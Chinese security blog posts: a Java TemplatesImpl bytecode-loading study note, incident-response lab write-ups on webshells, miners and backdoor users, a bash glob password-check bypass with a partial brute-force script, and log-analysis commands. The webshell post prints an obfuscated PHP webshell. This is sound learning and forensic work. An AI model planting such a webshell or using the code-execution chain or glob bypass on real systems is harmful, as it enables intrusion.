<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主程序</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesRce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/TemplatesBytes.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>setFieldValue</code>这个好高明，直接定义一个方法调用，避免冗余，主要逻辑就是获取成员变量然后修改里面的值就好</p>
<h5 id="注意点2"><a href="#注意点2" class="headerlink" title="注意点2"></a>注意点2</h5><p>链子一开始可以是newTransformer()也可以是getOutputProperties()，因为都是public，多一个getOutputProperties去调用也没什么影响，直接newTransformer也是可以的，不用纠结这个，直接修改代码里面的这个就行</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>b站：白日梦组长</p>
<p><a class="link"   href="https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/" >https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://exp10it.io/2022/11/java-classloader/" >https://exp10it.io/2022/11/java-classloader/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/news/8556" >https://xz.aliyun.com/news/8556<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.anquanke.com/post/id/260902" >https://www.anquanke.com/post/id/260902<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/hollischuang/p/14260801.html" >https://www.cnblogs.com/hollischuang/p/14260801.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机--webshell查杀</title>
    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-webshell%E6%9F%A5%E6%9D%80/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>护网要来了，好久没写博客了（滑跪）。前段时间朋友给了个号，做一波记录一下，一些语句和工具很值得学习。</p>
<h4 id="黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><a href="#黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx" class="headerlink" title="黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}"></a>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</h4><p>先把html文件夹下的源码下载到本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -czvf src.tar.gz ./*</span><br></pre></td></tr></table></figure>

<p>然后用d盾查杀一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240531225522.png" ></p>
<p>查看gz.php，看到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客使用的什么工具的shell-github地址的md5-flag-md5"><a href="#黑客使用的什么工具的shell-github地址的md5-flag-md5" class="headerlink" title="黑客使用的什么工具的shell github地址的md5 flag{md5}"></a>黑客使用的什么工具的shell github地址的md5 flag{md5}</h4><p>gz.php看的出来用的是哥斯拉的木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla</span><br><span class="line">md5:39392de3218c333f794befef07ac9257</span><br></pre></td></tr></table></figure>

<h4 id="黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx"><a href="#黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx" class="headerlink" title="黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx"></a>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</h4><p>D盾看到有一个.Mysqli.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/include/Db/.Mysqli.php</span><br><span class="line">md5:aebac0e58cd6c5fad1695ee4d1ac1919</span><br></pre></td></tr></table></figure>

<h4 id="黑客免杀马完整路径-md5-flag-md5"><a href="#黑客免杀马完整路径-md5-flag-md5" class="headerlink" title="黑客免杀马完整路径 md5 flag{md5}"></a>黑客免杀马完整路径 md5 flag{md5}</h4><p>d盾看到有一个top.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ERsDHgEUC1hI</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$fun</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$fun</span>[<span class="variable">$i</span>] = <span class="variable">$fun</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$s</span>.<span class="variable">$_GET</span>[<span class="string">&quot;func2&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$fun</span>);</span><br></pre></td></tr></table></figure>

<p>明显有混淆和编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/var/www/html/wap/top.php</span><br><span class="line">md5:eeff2eabfd9b7a6d26fc1a53d3f7d1de</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>sh脚本中==判断的几个情况</title>
    <url>/2024/04/23/sh%E8%84%9A%E6%9C%AC%E4%B8%AD-%E5%88%A4%E6%96%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E6%83%85%E5%86%B5/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>今天看到一个脚本需要爆破密码，我在已知密码是18位的情况下，妄想写个脚本去爆破，肯定是失败的，最后看到正确的脚本，我注意到里面用到*，最开始的理解是通配符绕过去了，经过shell脚本大佬·群主老师·云淡__风轻的点拨，我了解到一个关于shell脚本的知识点，有必要写个笔记记录一下。</p>
<h4 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h4><h5 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;&#x3D;绕过"></a>&#x3D;&#x3D;绕过</h5><p>先看脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == $input ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>逻辑就是定义一个password，然后我们的输入保存在input里，比较input和password看看o不ok</p>
<p>正常情况下我们要ok就应该输入‘qwe123’，和password去匹配</p>
<p>但是我们可以用到*, *在shell里叫glob，也叫通配符， *的作用可以用来匹配任何长度的任何字符，类似于正则里面的 *，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213816.png" ></p>
<p>后来了解到glob有其他字符，各自有不同的功能，比如?可以匹配任意字符串，在我知道密码长度的情况下输入n个?，也能绕过</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213914.png" ></p>
<h5 id="没法用的情况1"><a href="#没法用的情况1" class="headerlink" title="*没法用的情况1"></a>*没法用的情况1</h5><p>如果脚本长这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == &quot;$input&quot; ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p><strong>注意到$input前后多了引号</strong>，这个时候再使用*去通配就会失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423214332.png" ></p>
<p><strong>原因是：给$input前后加上引号，会导致*没办法展开，所以通配不了，这个时候只能输入和password一模一样的字符才能ok</strong></p>
<h5 id="没法用的情况2"><a href="#没法用的情况2" class="headerlink" title="*没法用的情况2"></a>*没法用的情况2</h5><p>这个时候的脚本长这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $input == $password ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>对比第一个脚本，在判断里面$input $password的位置调换了</p>
<p>这个东西有点抽象，群主当时给了例子</p>
<p>我自己复现了一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423215113.png" ></p>
<p>接下来理解一下：*.txt能够代表很多个txt文件，他不能只等于1.txt，所以no，但是1.txt是 *.txt里面的一个，所以可以ok</p>
<p><strong>通俗地讲就是多个文件不能等于特定的那一个，特定的一个文件属于多个文件里</strong></p>
<p>回到input那里，我们给他输入*，就符合多个可能对应特定的一个，所以不能，所以not ok</p>
<h4 id="绕过的应用"><a href="#绕过的应用" class="headerlink" title="*绕过的应用"></a>*绕过的应用</h4><p>了解到三个用法，有这个思路就可以用来爆破密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="built_in">all</span> = <span class="built_in">list</span>(string.ascii_letters + string.digits)  <span class="comment"># 创建包含所有字母和数字的字符列表</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span>  <span class="comment"># 初始化密码为空字符串</span></span><br><span class="line">found = <span class="literal">False</span>  <span class="comment"># 初始化 found 变量为 False，表示密码尚未找到</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">				command = <span class="string">f&quot;echo &#x27;<span class="subst">&#123;password&#125;</span><span class="subst">&#123;character&#125;</span>*&#x27;｜对应的脚本操作</span></span><br><span class="line"><span class="string">        ...后续的判断</span></span><br></pre></td></tr></table></figure>

<p>command &#x3D; f”echo ‘{password}{character}*’注意这里最后就是有一个 *去通配，然后一位一位地去爆破密码</p>
<p>肯定不止这个用法，后续待更新</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>肯定是要感谢群主的耐心指导</p>
<p>这个知识点现在理解了就觉得没什么，不过还是值得记录下来的</p>
]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机-windows实战</title>
    <url>/2024/06/01/%E7%8E%84%E6%9C%BA-windows%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h3 id="emlog"><a href="#emlog" class="headerlink" title="emlog"></a>emlog</h3><p>先远程桌面连接，用微软的remote desktop还挺方便</p>
<h4 id="找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交"><a href="#找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交" class="headerlink" title="找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;"></a>找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;</h4><p>用d盾查杀，找到shell.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601143330.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141231.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;rebeyond&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交"><a href="#分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交" class="headerlink" title="分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;"></a>分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141541.png" ></p>
<p>这种就是看日志，找到phpstudy路径下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141733.png" ></p>
<p>随便一看就是192.168.126.1这个ip一直在访问shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.126.1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交"><a href="#分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交" class="headerlink" title="分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交"></a>分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交</h4><p>思路可以看用户表或者直接看用户目录下多了什么</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601142716.png" ></p>
<p>有个hacker138</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601142902.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hacker138&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交"><a href="#分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交" class="headerlink" title="分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;"></a>分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</h4><p>思路是去黑客新增的用户目录下看看有什么，在桌面下发现“kuang”文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601143018.png" ></p>
<p>用工具反编译一下就能看到矿池域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;wakuang.zhigongshanfang.top&#125;</span><br></pre></td></tr></table></figure>

<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><h4 id="请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss"><a href="#请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss" class="headerlink" title="请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}"></a>请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}</h4><p>先看日志，看nginx的日志</p>
<p>思路是看最早是什么时候出现302重定向，进入manage</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-01%2014.41.46.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023:04:29 22:45:23&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请提交攻击者的浏览器版本-flag-Firgfox-2200"><a href="#请提交攻击者的浏览器版本-flag-Firgfox-2200" class="headerlink" title="请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}"></a>请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}</h4><p>上一道题可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Firefox/110.0&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请提交攻击者目录扫描所使用的工具名称"><a href="#请提交攻击者目录扫描所使用的工具名称" class="headerlink" title="请提交攻击者目录扫描所使用的工具名称"></a>请提交攻击者目录扫描所使用的工具名称</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601144356.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Fuzz Faster U Fool&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到攻击者写入的恶意后门文件，提交文件名（完整路径）"><a href="#找到攻击者写入的恶意后门文件，提交文件名（完整路径）" class="headerlink" title="找到攻击者写入的恶意后门文件，提交文件名（完整路径）"></a>找到攻击者写入的恶意后门文件，提交文件名（完整路径）</h4><p>用D盾查杀一下，找到.x.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601145929.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601150123.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\.x.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"><a href="#找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）" class="headerlink" title="找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"></a>找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-01%2015.02.39.png" ></p>
<p>还是被D盾发现了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\usr\themes\default\post.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe"><a href="#请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe" class="headerlink" title="请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}"></a>请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}</h4><p>windows目录下有个360.exe和x.bat（内容是”C:\Windows\360.exe”）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601150516.png" ></p>
<p>沙箱也能看到360.exe是木马</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601151153.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;x.bat&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机--日志分析</title>
    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="linux日志分析"><a href="#linux日志分析" class="headerlink" title="linux日志分析"></a>linux日志分析</h3><h4 id="有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr </span><br></pre></td></tr></table></figure>

<p>学一把这些语句</p>
<p><strong>grep</strong>把有”Failed password for root”的行挑出来，**-a**是将文件作为文本文件处理，避免某些情况下文件被识别为二进制文件</p>
<p><strong>awk</strong>把挑出来的行里第11个字段挑出来（按空格分），这里挑出那些ip地址</p>
<p><strong>sort</strong>把ip地址排序，**-n<strong>按数字排序，</strong>-r**降序排序</p>
<p><strong>uniq</strong>去重,<strong>-c</strong>输出中显示每个行重复出现的次数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2,192.168.200.32,192.168.200.31&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割"><a href="#ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割" class="headerlink" title="ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log<span class="comment"># cat auth.log* | grep -a &quot;Accept&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span></span><br><span class="line">      2 192.168.200.2</span><br><span class="line">      1 202.78.166.217</span><br></pre></td></tr></table></figure>

<p>思路和上一道差不多，grep过滤的字段改成”Accept”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125; # 要删掉自己的ip</span><br></pre></td></tr></table></figure>

<h4 id="爆破用户名字典是什么？如果有多个使用”-”分割"><a href="#爆破用户名字典是什么？如果有多个使用”-”分割" class="headerlink" title="爆破用户名字典是什么？如果有多个使用”,”分割"></a>爆破用户名字典是什么？如果有多个使用”,”分割</h4><p>上题解</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;| uniq -c | sort -nr</span><br><span class="line">      5  invalid user user</span><br><span class="line">      5  invalid user hello</span><br><span class="line">      5  invalid user</span><br><span class="line">      4  root</span><br><span class="line">      1  root</span><br><span class="line">      1  root</span><br><span class="line">      1  invalid user test3</span><br><span class="line">      1  invalid user test2</span><br><span class="line">      1  invalid user test1</span><br></pre></td></tr></table></figure>

<p>对于这个perl比较陌生</p>
<p><strong>Perl</strong> 命令，用于从匹配的日志行中提取用户名。</p>
<p><code>while($_=&lt;&gt;)</code>逐行读取输入（即日志文件的内容）。</p>
<p><code> /for(.*?) from/</code>使用正则表达式匹配 for 和from 之间的内容（即用户名）。</p>
<p> <code>print &quot;$1\n&quot;;</code>打印匹配到的用户名（捕获组 <strong>$1</strong>）</p>
<p>思路就是用grep过滤后用perl -e处理每行语句，把for和from之间的字段（通常是用户名）挑出来**，再进行后续操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="登陆成功的IP共爆破了多少次"><a href="#登陆成功的IP共爆破了多少次" class="headerlink" title="登陆成功的IP共爆破了多少次"></a>登陆成功的IP共爆破了多少次</h4><p>第一题的命令已经过滤出来了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;4&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="黑客登陆主机后新建了一个后门用户，用户名是多少"></a>黑客登陆主机后新建了一个后门用户，用户名是多少</h4><p>可以直接看&#x2F;etc&#x2F;passwd，多了个test2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">test2:x:1000:1000::/home/test2:/bin/sh</span><br><span class="line">debian:x:1001:1001:Debian:/home/debian:/bin/bash</span><br></pre></td></tr></table></figure>

<p>也可以</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log* | grep -a &quot;useradd&quot; | grep -a &quot;linux-rz&quot;</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;test2&#125;</span><br></pre></td></tr></table></figure>

<h3 id="apache日志分析"><a href="#apache日志分析" class="headerlink" title="apache日志分析"></a>apache日志分析</h3><h4 id="提交当天访问次数最多的IP，即黑客IP："><a href="#提交当天访问次数最多的IP，即黑客IP：" class="headerlink" title="提交当天访问次数最多的IP，即黑客IP："></a>提交当天访问次数最多的IP，即黑客IP：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat access.log.1 | grep &quot;03/Aug/2023:08:&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort | uniq -c | sort -nr | head -n 10</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      1 192.168.200.211</span><br></pre></td></tr></table></figure>

<p>这次grep过滤的是”03&#x2F;Aug&#x2F;2023:08:”</p>
